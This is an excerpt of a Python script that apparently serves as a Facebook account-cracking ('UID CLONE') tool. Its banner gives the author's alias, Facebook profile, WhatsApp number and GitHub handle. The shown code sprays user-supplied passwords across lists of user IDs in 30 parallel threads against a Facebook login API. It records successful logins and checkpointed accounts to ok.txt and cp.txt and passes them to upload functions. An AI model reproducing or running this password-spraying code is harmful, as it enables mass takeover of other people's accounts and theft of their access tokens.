...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/profile.php?id=100078990605486")
...
def notice():
	...
	#runtxt("\033[0;92m ADMIN FACEBOOK >> HHPMISLAM ")
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER : Heart Hacker 
     \033[1;91m➣ \033[1;92mFACEBOOK : Md Abdullah (Heart Hacker l
     \033[1;93m➣ \033[1;92mWHATSAPP : 01781043094 (not for call)
     \033[1;96m➣ \033[1;92mGITHUB : hacker404-3301
     \033[1;95m➣ \033[1;92mTOOLS TYPE : UID CLONE
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
    """)
...
#				exit()
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR HHPM "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:HHPM): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [ABIR] : \033[0;97m %s/%s -> \033[0;92m [HHPM-OK:%s ]- \033[0;93m[HHPM-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
    ...
    'viewport-width': '980',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[HHPM-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [HHPM-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[HHPM-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [HHPM-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
